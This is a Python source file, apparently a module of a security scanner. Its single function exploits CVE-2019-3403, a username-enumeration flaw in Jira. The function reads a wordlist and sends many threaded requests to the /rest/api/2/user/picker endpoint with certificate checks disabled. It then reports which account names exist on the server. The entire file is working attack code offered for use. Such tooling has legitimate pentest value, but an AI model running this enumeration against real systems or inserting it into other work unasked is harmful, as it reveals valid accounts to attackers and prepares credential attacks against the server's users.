import requests
import threading
from colorama import Fore, Style

def cve_2019_3403_brute(base_url, path, dict_file, num_threads=5):
    """
    Check for valid usernames using the /rest/api/2/user/picker endpoint.
    Uses threading to improve performance.
    """
    vulnerabilities = []
    headers = {
        'X-Atlassian-Token': 'no-check'
    }
    lock = threading.Lock()  # Ensure thread-safe print
    
    verbose = False

    def worker(username_chunk):
        """
        Worker function for each thread to check a chunk of usernames.
        """
        for count, username in enumerate(username_chunk, start=1):
            url_to_test = f"{base_url.rstrip('/')}{path.rstrip('/')}/rest/api/2/user/picker?query={username}"
            if verbose:
                print(f"{Fore.BLUE}[Testing Username]{Style.RESET_ALL}: {username} on {url_to_test}")
            else:
                pass
            try:
                response = requests.get(url_to_test, headers=headers, allow_redirects=False, verify=False)
                if response.status_code == 200:
                    data = response.json()
                    for user in data.get('users', []):
                        if user.get("name", "").lower() == username.lower():
                            vulnerabilities.append(f"+ [CVE-2019-3403 | Username Enumeration] Valid username found: {username}")
                            with lock:
                                print(f"{Fore.GREEN}+ Valid username found: {username} | URL: {url_to_test}{Style.RESET_ALL}")
                elif response.status_code == 404:
                    # No output for not found usernames to reduce noise
                    pass
                elif response.status_code == 403:
                    with lock:
                        print(f"{Fore.YELLOW}- Forbidden (403): Cannot access username {username}{Style.RESET_ALL}")
                elif response.status_code == 302:
                    with lock:
                        print(f"{Fore.YELLOW}- Redirected (302) for username {username}{Style.RESET_ALL}")
                else:
                    with lock:
                        print(f"{Fore.YELLOW}- HTTP Code {response.status_code} for username: {username}{Style.RESET_ALL}")
                
                # Print progress every 250 usernames
                if count % 250 == 0:
                    with lock:
                        print(f"{Fore.CYAN}INFO: {count} usernames tested in this chunk...{Style.RESET_ALL}")
                        
            except Exception as e:
                with lock:
                    print(f"{Fore.RED}* An error occurred while checking: {e}{Style.RESET_ALL}")

    # Read usernames from the dictionary file
    try:
        with open(dict_file, 'r') as file:
            usernames = [line.strip() for line in file if line.strip()]

        total_usernames = len(usernames)
        print(f"{Fore.YELLOW}INFO: Total usernames to check: {total_usernames}{Style.RESET_ALL}")

        # Divide the usernames among the specified number of threads
        chunk_size = len(usernames) // num_threads
        threads = []

        for i in range(num_threads):
            start_index = i * chunk_size
            end_index = (i + 1) * chunk_size if i < num_threads - 1 else len(usernames)
            thread = threading.Thread(target=worker, args=(usernames[start_index:end_index],))
            threads.append(thread)
            thread.start()

        # Wait for all threads to complete
        for thread in threads:
            thread.join()

    except FileNotFoundError:
        print(f"{Fore.RED}- File not found: {dict_file}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}- An error occurred while reading {dict_file}: {e}{Style.RESET_ALL}")

    return vulnerabilities  # Return the discovered vulnerabilities
